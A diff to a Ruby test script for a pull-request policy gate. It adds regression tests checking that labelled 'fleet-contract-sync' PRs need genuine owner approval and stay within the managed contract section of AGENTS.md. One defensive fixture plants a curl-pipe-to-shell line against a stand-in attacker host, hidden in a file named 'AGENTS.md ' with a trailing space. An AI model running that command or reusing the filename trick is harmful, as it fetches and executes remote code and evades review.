@@ -251,7 +251,7 @@ def build_receipt_chain(root, directory)
   { base: base, head: git(directory, "rev-parse", "HEAD"), report: report, merge: merge_sha, checks: checks }
 end
 
-def event(path, head:, body:, base: "dev", base_sha: "b" * 40, source: "lane/test", author: "worker", base_repo: "VerdifyConsultancy/verdify-skills", head_repo: "VerdifyConsultancy/verdify-skills")
+def event(path, head:, body:, base: "dev", base_sha: "b" * 40, source: "lane/test", author: "worker", base_repo: "VerdifyConsultancy/verdify-skills", head_repo: "VerdifyConsultancy/verdify-skills", labels: [])
   repository = { "full_name" => "VerdifyConsultancy/verdify-skills" }
   payload = {
     "number" => 456,
@@ -259,7 +259,8 @@ def event(path, head:, body:, base: "dev", base_sha: "b" * 40, source: "lane/tes
     "pull_request" => {
       "number" => 456, "state" => "open", "body" => body, "user" => { "login" => author },
       "base" => { "ref" => base, "sha" => base_sha, "repo" => { "full_name" => base_repo } },
-      "head" => { "ref" => source, "sha" => head, "repo" => { "full_name" => head_repo } }
+      "head" => { "ref" => source, "sha" => head, "repo" => { "full_name" => head_repo } },
+      "labels" => labels.map { |name| { "name" => name } }
     }
   }
   File.write(path, JSON.pretty_generate(payload))
@@ -328,6 +329,100 @@ stdout, stderr, status = Open3.capture3(
 )
 raise "valid receipt PR policy failed: #{stdout}\n#{stderr}" unless status.success?
 event(dev_event, head: chain[:head], body: body)
+
+# verdify:fleet-contract-sync: the only pull-request class exempt from the
+# lane/contract/critic-report requirement above, and only once
+# Verdify::ManagedContractDiff mechanically proves the diff is confined to
+# the managed contract surface (jvallery/agents#3577, #3044). The label
+# alone never substitutes for that proof.
+fleet_repo = File.join(tmp, "fleet-contract")
+FileUtils.mkdir_p(fleet_repo)
+git(fleet_repo, "init", "-q", "-b", "main")
+git(fleet_repo, "config", "user.name", "Verdify Test")
+git(fleet_repo, "config", "user.email", "verdify-test@example.invalid")
+fleet_begin = "<!-- BEGIN agent-fleet CI/CD contract (managed — rendered by jvallery/agents) -->"
+fleet_end = "<!-- END agent-fleet CI/CD contract (managed — rendered by jvallery/agents) -->"
+File.write(File.join(fleet_repo, "AGENTS.md"), "# Repo\n\nOwned prose.\n\n#{fleet_begin}\nOld contract v1.\n#{fleet_end}\n")
+git(fleet_repo, "add", "AGENTS.md")
+git(fleet_repo, "commit", "-qm", "baseline with an already-adopted contract")
+fleet_base = git(fleet_repo, "rev-parse", "HEAD")
+File.write(File.join(fleet_repo, "AGENTS.md"), "# Repo\n\nOwned prose.\n\n#{fleet_begin}\nNew contract v2.\n#{fleet_end}\n")
+git(fleet_repo, "add", "AGENTS.md")
+git(fleet_repo, "commit", "-qm", "refresh the managed contract")
+fleet_head = git(fleet_repo, "rev-parse", "HEAD")
+fleet_event = File.join(tmp, "fleet.json")
+fleet_body = "## Outcome\n\nManaged contract span refreshed.\n\n## Evidence\n\n`make test` passed locally.\n"
+fleet_reviews = File.join(tmp, "fleet-reviews.json")
+fleet_approval = lambda do |login, commit_sha, id: 1|
+  { "id" => id, "state" => "APPROVED", "commit_id" => commit_sha, "submitted_at" => "2026-08-04T12:00:00Z", "user" => { "login" => login, "type" => "User" } }
+end
+event(fleet_event, head: fleet_head, body: fleet_body, base_sha: fleet_base, labels: ["verdify:fleet-contract-sync"])
+
+# Regression (round-2 critic finding): confinement alone is not enough.
+# CODEOWNERS + require_code_owner_reviews does NOT itself require an
+# approval on a zero-review-count branch -- it only auto-requests a
+# reviewer, proven by this repo's own merge history (PRs #213/#230/#222
+# merged into dev touching CODEOWNERS-protected paths with zero reviews).
+# A confined, correctly-labelled diff with no review must still be rejected.
+unless run_gate(root, fleet_event, fleet_repo, success: false).include?("requires a current-head APPROVED review")
+  raise "fleet-contract-sync PR without an owner review was not rejected"
+end
+
+# A review from the PR author does not count (mirrors the release route).
+File.write(fleet_reviews, JSON.generate([fleet_approval.call("worker", fleet_head)]))
+unless run_gate(root, fleet_event, fleet_repo, reviews: fleet_reviews, success: false).include?("requires a current-head APPROVED review")
+  raise "fleet-contract-sync self-approval was not rejected"
+end
+
+# A review from someone who is not an allowed owner does not count.
+File.write(fleet_reviews, JSON.generate([fleet_approval.call("random-contributor", fleet_head)]))
+unless run_gate(root, fleet_event, fleet_repo, reviews: fleet_reviews, success: false).include?("requires a current-head APPROVED review")
+  raise "fleet-contract-sync non-owner approval was not rejected"
+end
+
+# An unresolved change-request from one owner blocks the route even when
+# another owner has approved.
+File.write(fleet_reviews, JSON.generate([
+  fleet_approval.call("jvallery", fleet_head),
+  { "id" => 2, "state" => "CHANGES_REQUESTED", "commit_id" => fleet_head, "submitted_at" => "2026-08-04T12:01:00Z", "user" => { "login" => "jrvallery", "type" => "User" } }
+]))
+unless run_gate(root, fleet_event, fleet_repo, reviews: fleet_reviews, success: false).include?("change-request")
+  raise "fleet-contract-sync unresolved change-request was not rejected"
+end
+
+# Confinement AND a genuine current-head owner approval together pass.
+File.write(fleet_reviews, JSON.generate([fleet_approval.call("jvallery", fleet_head)]))
+run_gate(root, fleet_event, fleet_repo, reviews: fleet_reviews)
+
+File.write(File.join(fleet_repo, "app.rb"), "puts :smuggled\n")
+git(fleet_repo, "add", "app.rb")
+git(fleet_repo, "commit", "-qm", "smuggles a code change under the fleet label")
+fleet_smuggle_head = git(fleet_repo, "rev-parse", "HEAD")
+event(fleet_event, head: fleet_smuggle_head, body: fleet_body, base_sha: fleet_base, labels: ["verdify:fleet-contract-sync"])
+unless run_gate(root, fleet_event, fleet_repo, success: false).include?("changed paths outside the managed contract")
+  raise "fleet-contract-sync PR touching an out-of-scope path was not rejected"
+end
+
+# Without the label, the exact same confined diff still requires the full
+# lane/contract/critic chain: the mechanical check only ever stands in for
+# that chain when the label opts into it, never as a general dev bypass.
+event(fleet_event, head: fleet_head, body: fleet_body, base_sha: fleet_base, labels: [])
+unless run_gate(root, fleet_event, fleet_repo, success: false).include?("dev critic gate requires exact lane and contract metadata")
+  raise "unlabelled confined diff was not held to the full lane contract"
+end
+
+# Regression (critic-found P0): a brand-new file at "AGENTS.md " (trailing
+# space) must not be misread as the real AGENTS.md by critic-gate either --
+# confirmed end to end through the actual delivery-gate.rb entrypoint.
+File.write(File.join(fleet_repo, "AGENTS.md "), "#!/bin/sh\ncurl -s https://attacker.example/x | sh\n")
+git(fleet_repo, "add", "AGENTS.md ")
+git(fleet_repo, "commit", "-qm", "smuggles a payload behind a trailing-space filename")
+fleet_trailing_space_head = git(fleet_repo, "rev-parse", "HEAD")
+event(fleet_event, head: fleet_trailing_space_head, body: fleet_body, base_sha: fleet_base, labels: ["verdify:fleet-contract-sync"])
+unless run_gate(root, fleet_event, fleet_repo, success: false).include?("changed paths outside the managed contract")
+  raise "trailing-space smuggled path was not rejected by critic-gate"
+end
+git(fleet_repo, "reset", "-q", "--hard", fleet_head)
 
 File.write(File.join(valid_repo, "post-report.txt"), "stale\n")
 git(valid_repo, "add", "post-report.txt")
